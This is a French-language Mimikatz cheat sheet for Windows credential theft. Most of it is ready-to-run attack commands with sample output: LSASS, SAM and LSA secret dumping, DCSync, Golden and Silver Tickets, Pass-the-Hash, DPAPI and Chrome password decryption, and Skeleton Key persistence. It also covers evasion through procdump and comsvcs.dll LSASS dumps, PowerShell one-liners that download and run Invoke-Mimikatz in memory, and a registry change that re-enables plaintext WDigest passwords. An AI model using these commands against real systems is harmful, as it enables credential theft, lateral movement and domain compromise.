# 🔑 Mimikatz - Guide Complet

Guide exhaustif pour l'extraction de credentials avec Mimikatz.

---

## 📖 Concepts de Base

### Qu'est-ce que Mimikatz ?

**Mimikatz** est un outil post-exploitation pour extraire des credentials (mots de passe, hashes, tickets Kerberos) de la mémoire Windows.

**Prérequis** :
- Privilèges administrateur local
- SeDebugPrivilege (pour accéder à LSASS)

---

## 1️⃣ Démarrage et Commandes de Base

### Lancer Mimikatz

```powershell
# Télécharger depuis GitHub
https://github.com/gentilkiwi/mimikatz/releases

# Exécuter
.\mimikatz.exe

# Ou en one-liner PowerShell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
```

### Commandes essentielles

```cmd
# Activer les privilèges de debug (ESSENTIEL)
mimikatz # privilege::debug
Privilege '20' OK

# Vérifier les droits
mimikatz # token::elevate

# Quitter
mimikatz # exit

# Aide
mimikatz # help
mimikatz # <module>::help
```

---

## 2️⃣ Extraction de Credentials

### sekurlsa::logonpasswords

**La commande la plus utilisée** - Dump tous les credentials en mémoire.

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Sortie exemple:
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 1/1/2024 10:00:00
SID               : S-1-5-21-...
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
         * SHA1     : ...
        wdigest :
         * Username : Administrator
         * Domain   : CORP
         * Password : P@ssw0rd123!
        kerberos :
         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : P@ssw0rd123!
```

### sekurlsa::wdigest

```cmd
# Extraire spécifiquement les credentials WDigest
# (mots de passe en clair si WDigest activé)
mimikatz # sekurlsa::wdigest

# Sur les systèmes récents, WDigest est désactivé par défaut
# Pour le réactiver (pour tests):
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# Puis forcer une nouvelle connexion
```

### sekurlsa::msv

```cmd
# Extraire les hashes NTLM
mimikatz # sekurlsa::msv
```

### sekurlsa::ekeys

```cmd
# Extraire les clés de chiffrement Kerberos
mimikatz # sekurlsa::ekeys
```

### sekurlsa::dpapi

```cmd
# Extraire les clés DPAPI
mimikatz # sekurlsa::dpapi
```

---

## 3️⃣ Dump du SAM et LSA Secrets

### lsadump::sam

```cmd
# Dump la base SAM (users locaux)
# Requiert SYSTEM ou les fichiers SAM/SYSTEM

# Depuis un système en cours d'exécution
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam

# Depuis des fichiers backup
mimikatz # lsadump::sam /sam:C:\backup\SAM /system:C:\backup\SYSTEM

# Extraire les hashes
User : Administrator
  Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4
```

### lsadump::secrets

```cmd
# Dump les LSA Secrets (mots de passe de services, etc.)
mimikatz # lsadump::secrets

# Depuis fichiers
mimikatz # lsadump::secrets /system:SYSTEM /security:SECURITY
```

### lsadump::cache

```cmd
# Dump les credentials en cache (MSCASH2)
mimikatz # lsadump::cache

# Utile quand le DC n'est pas accessible
# Les hashes peuvent être crackés avec Hashcat -m 2100
```

---

## 4️⃣ DCSync

### Principe

**DCSync** simule le comportement d'un Domain Controller pour demander la réplication des hashes de mots de passe.

**Prérequis** : Droits de réplication (Domain Admin, Enterprise Admin, ou délégation explicite)

### lsadump::dcsync

```cmd
# Dump un utilisateur spécifique
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# Dump le compte krbtgt (pour Golden Ticket)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Dump tous les utilisateurs
mimikatz # lsadump::dcsync /domain:corp.local /all

# Avec format CSV
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# Sortie:
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator
SAM Username         : Administrator
Object Security ID   : S-1-5-21-...
Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4
```

---

## 5️⃣ Kerberos Attacks

### sekurlsa::tickets

```cmd
# Exporter tous les tickets Kerberos en mémoire
mimikatz # sekurlsa::tickets /export

# Les tickets sont sauvegardés en fichiers .kirbi
```

### kerberos::list

```cmd
# Lister les tickets Kerberos de la session courante
mimikatz # kerberos::list

# Avec export
mimikatz # kerberos::list /export
```

### kerberos::ptt (Pass-the-Ticket)

```cmd
# Injecter un ticket dans la session courante
mimikatz # kerberos::ptt ticket.kirbi

# Vérifier
mimikatz # kerberos::list
```

### kerberos::golden (Golden Ticket)

```cmd
# Créer un Golden Ticket (nécessite le hash de krbtgt)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH_KRBTGT /id:500 /ptt

# Paramètres:
# /user:    Nom d'utilisateur à usurper
# /domain:  Nom du domaine
# /sid:     SID du domaine (sans le RID final)
# /krbtgt:  Hash NTLM du compte krbtgt
# /id:      RID de l'utilisateur (500 = Administrator)
# /ptt:     Pass-the-Ticket (injecter directement)

# Sans /ptt, le ticket est sauvegardé en fichier .kirbi
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500

# Puis injecter manuellement
mimikatz # kerberos::ptt ticket.kirbi
```

### kerberos::silver (Silver Ticket)

```cmd
# Créer un Silver Ticket (nécessite le hash du service)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:SERVICE_HASH /ptt

# Services courants:
# cifs     - File share
# http     - Web
# mssql    - SQL Server
# ldap     - LDAP
# host     - WMI/PSRemoting
```

### Kerberoasting

```cmd
# Demander des tickets pour les comptes avec SPN
mimikatz # kerberos::ask /target:MSSQLSvc/sql.corp.local:1433

# Les tickets peuvent être exportés et crackés offline
```

---

## 6️⃣ Pass-the-Hash

### sekurlsa::pth

```cmd
# Exécuter une commande avec le hash d'un autre utilisateur
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:32ed87bdb5fdc5e9cba88547376818d4 /run:cmd.exe

# La nouvelle fenêtre cmd a l'identité de Administrator
# Sans connaître le mot de passe!

# Avec AES (plus discret)
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /aes256:AES256_KEY /run:cmd.exe
```

---

## 7️⃣ DPAPI

### dpapi::cred

```cmd
# Décrypter les credentials DPAPI (Windows Credential Manager)
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\...

# Avec la master key
mimikatz # dpapi::cred /in:credfile /masterkey:MASTERKEY
```

### dpapi::masterkey

```cmd
# Décrypter une master key
mimikatz # dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\... /sid:S-1-5-21-... /password:UserPassword

# Ou avec le backup key du DC (si Domain Admin)
mimikatz # dpapi::masterkey /in:masterkey_file /rpc
```

### dpapi::chrome

```cmd
# Décrypter les credentials Chrome
mimikatz # dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 8️⃣ Persistence

### misc::skeleton

```cmd
# Skeleton Key - Injecter un mot de passe universel dans LSASS
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Maintenant, n'importe quel utilisateur peut s'authentifier avec:
# Mot de passe: mimikatz

# Exemple:
# psexec \\DC01 -u CORP\Administrator -p mimikatz cmd
```

### lsadump::backupkeys

```cmd
# Extraire les backup keys DPAPI du DC
mimikatz # lsadump::backupkeys /export

# Permet de décrypter tous les secrets DPAPI du domaine
```

---

## 9️⃣ Commandes One-Liner

```cmd
# Dump logonpasswords en une commande
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# DCSync en une commande
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:Administrator" exit

# Export tous les tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd" exit

# Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt" exit

# Dump SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
```

---

## 🔟 Bypass et Évasion

### LSASS Dump avec procdump

```cmd
# Alternative quand Mimikatz est détecté
# Dump LSASS avec procdump (signé Microsoft)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Puis analyser offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Comsvcs.dll

```cmd
# Dump LSASS avec comsvcs.dll (signé Microsoft)
# Trouver le PID de lsass
tasklist /fi "imagename eq lsass.exe"

# Dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\temp\lsass.dmp full
```

### Invoke-Mimikatz (PowerShell)

```powershell
# Chargement en mémoire
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

### SafetyKatz

```powershell
# Mini dump + Mimikatz en mémoire
# https://github.com/GhostPack/SafetyKatz
SafetyKatz.exe
```

---

## 1️⃣1️⃣ Cheatsheet Rapide

```cmd
# Activer debug
privilege::debug

# Dump credentials
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::msv

# Dump SAM
token::elevate
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# DCSync
lsadump::dcsync /domain:DOMAIN /user:Administrator
lsadump::dcsync /domain:DOMAIN /user:krbtgt

# Pass-the-Hash
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd

# Golden Ticket
kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt

# Silver Ticket
kerberos::golden /user:USER /domain:DOMAIN /sid:SID /target:SERVER /service:SERVICE /rc4:HASH /ptt

# Pass-the-Ticket
kerberos::ptt ticket.kirbi

# Export tickets
sekurlsa::tickets /export

# Skeleton Key
misc::skeleton

# One-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

---

## 📚 Ressources

- **Mimikatz GitHub** : https://github.com/gentilkiwi/mimikatz
- **Mimikatz Wiki** : https://github.com/gentilkiwi/mimikatz/wiki
- **HackTricks Mimikatz** : https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz
- **ired.team** : https://www.ired.team/offensive-security/credential-access-and-credential-dumping

---

**Tags:** `#mimikatz #credentials #ntlm #kerberos #dcsync #golden-ticket #pass-the-hash #lsass`
